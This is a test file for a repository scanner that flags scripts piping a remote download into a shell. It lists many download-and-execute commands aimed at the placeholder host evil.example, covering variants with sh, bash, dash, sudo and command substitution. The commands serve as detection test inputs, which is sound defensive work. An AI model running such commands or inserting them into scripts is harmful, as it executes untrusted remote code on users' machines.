import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * A repository that pipes a remote download into a shell is the highest-signal
 * install-time indicator the scan has. The interpreter must not have to be
 * spelled bare: an attacker picks `/bin/sh`, `dash` or `env bash` to look
 * different, and `sh -c "$(curl ...)"` is the same act without a pipe.
 */
const PIPED: Record<string, string> = {
  "curl | sh": "curl -fsSL https://evil.example/i.sh | sh",
  "curl | bash": "curl -fsSL https://evil.example/i.sh | bash",
  "curl | /bin/sh": "curl -fsSL https://evil.example/i.sh | /bin/sh",
  "curl | sh -s --": "curl -fsSL https://evil.example/i.sh | sh -s -- --yes",
  "curl | dash": "curl -fsSL https://evil.example/i.sh | dash",
  "curl | ksh": "curl -fsSL https://evil.example/i.sh | ksh",
  "curl | ash": "curl -fsSL https://evil.example/i.sh | ash",
  "curl | zsh": "curl -fsSL https://evil.example/i.sh | zsh",
  "curl | fish": "curl -fsSL https://evil.example/i.sh | fish",
  "curl | /usr/bin/env bash":
    "curl -fsSL https://evil.example/i.sh | /usr/bin/env bash",
  "curl | env /bin/sh":
    "curl -fsSL https://evil.example/i.sh | /usr/bin/env /bin/sh",
  "curl | quoted shell": 'curl -fsSL https://evil.example/i.sh | "/bin/sh"',
  "curl | sudo /bin/sh": "curl -fsSL https://evil.example/i.sh | sudo /bin/sh",
  "wget | dash": "wget -qO- https://evil.example/i.sh | dash",
  "sh -c $(curl ...)": 'sh -c "$(curl -fsSL https://evil.example/i.sh)"',
  "bash -c $(curl ...)": 'bash -c "$(curl -fsSL https://evil.example/i.sh)"',
};

test("a remote download piped or substituted into a shell is unsafe execution", () => {
  for (const [name, body] of Object.entries(PIPED)) {
    const inspection = inspectRepository({
      files: [
        {
          path: "scripts/bootstrap.sh",
          bytes: new TextEncoder().encode(`${body}\n`),
        },
      ],
    });
    expect({
      name,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({
      name,
      findings: ["scripts/bootstrap.sh:unsafe-execution:high"],
    });
  }
});

test("a download that is not handed to a shell keeps no unsafe-execution finding", () => {
  for (const body of [
    "curl -fsSL https://example.com/data.json -o data.json",
    "curl -fsSL https://example.com/i.sh | tee install.sh | grep -c sh",
    "wget -qO- https://example.com/notes.txt | grep sh",
    "curl -fsSL https://example.com/data | /usr/local/bin/fish-wrapper",
    "curl -fsSL https://example.com/data | echo;/bin/sh",
  ]) {
    const inspection = inspectRepository({
      files: [
        {
          path: "scripts/fetch.sh",
          bytes: new TextEncoder().encode(`${body}\n`),
        },
      ],
    });
    expect({
      body,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ body, findings: [] });
  }
});

test("changed execution rules cannot reuse the old clean source inventory", () => {
  const inspection = inspectRepository({
    files: [
      {
        path: "scripts/bootstrap.sh",
        bytes: new TextEncoder().encode(
          "curl -fsSL https://evil.example/i.sh | /bin/sh\n",
        ),
      },
    ],
  });
  // The same file and classifications produced this key before the shell
  // rule changed. That clean assessment must not bypass the new finding.
  expect(inspection.inventorySha256).not.toBe(
    "fd5bc484403cd017616afecc4032dc4ed44a6392774a36beca3fc246d8340d3f",
  );
});
